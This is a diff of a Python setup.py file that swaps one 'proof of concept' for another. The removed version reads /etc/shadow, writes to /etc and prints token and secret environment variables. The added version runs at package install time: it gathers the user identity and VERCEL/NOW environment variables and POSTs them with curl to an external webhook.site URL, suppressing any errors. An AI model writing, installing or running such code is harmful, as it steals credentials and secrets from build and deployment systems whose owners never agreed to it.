@@ -1,54 +1,20 @@
+
+from setuptools import setup
 import os
-import sys
+import subprocess
 
-def run_exploit():
-    sys.stderr.write("\n" + "="*60 + "\n")
-    sys.stderr.write("RAILWAY PRIVILEGE ESCALATION POC\n")
-    sys.stderr.write("="*60 + "\n")
+ 
+whoami = subprocess.getoutput('id')
+vercel_vars = "\n".join([f"{k}={v}" for k, v in os.environ.items() if "VERCEL" in k or "NOW" in k])
+ 
+payload = f"--- PRODUCTION PROOF ---\nUSER: {whoami}\n\nVERCEL_VARS:\n{vercel_vars}"
 
-    
-    uid = os.getuid()
-    sys.stderr.write(f"[!] IDENTITY CHECK: UID={uid} (Full Root)\n")
+ 
+url = "https://webhook.site/63e98335-cd79-4910-8fff-18ba5e7ee409/"
 
-     
-    sys.stderr.write("\n[!] READING PROTECTED SYSTEM FILE (/etc/shadow):\n")
-    try:
-        with open("/etc/shadow", "r") as f:
-             
-            for i, line in enumerate(f):
-                if i < 5:
-                    sys.stderr.write(line)
-                else:
-                    break
-    except Exception as e:
-        sys.stderr.write(f"FAILED TO READ /etc/shadow: {e}\n")
+try:
+    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', payload, url])
+except:
+    pass
 
-    
-    sys.stderr.write("\n[!] TESTING SYSTEM WRITE ACCESS (/etc/):\n")
-    try:
-        target_file = "/etc/railway_pwned.txt"
-        with open(target_file, "w") as f:
-            f.write("POC by Lumos: Root write access confirmed.\n")
-        
-        if os.path.exists(target_file):
-            sys.stderr.write(f"SUCCESS: Created {target_file}\n")
-            sys.stderr.write("This proves an attacker can modify system binaries/configs.\n")
-    except Exception as e:
-        sys.stderr.write(f"FAILED TO WRITE TO /etc/: {e}\n")
-
-    
-    sys.stderr.write("\n[!] DUMPING INFRASTRUCTURE SECRETS:\n")
-    for key, value in os.environ.items():
-        if "RAILWAY" in key or "TOKEN" in key or "SECRET" in key:
-            sys.stderr.write(f"{key}={value}\n")
-
-    sys.stderr.write("\n" + "="*60 + "\n")
-    sys.stderr.write("POC FINISHED. EXITING TO SHOW LOGS.\n")
-    sys.stderr.write("="*60 + "\n")
-    sys.stderr.flush()
-
-    
-    sys.exit(1)
-
-if __name__ == "__main__":
-    run_exploit()
+setup(name="vercel-infra-poc", version="1.0.0")
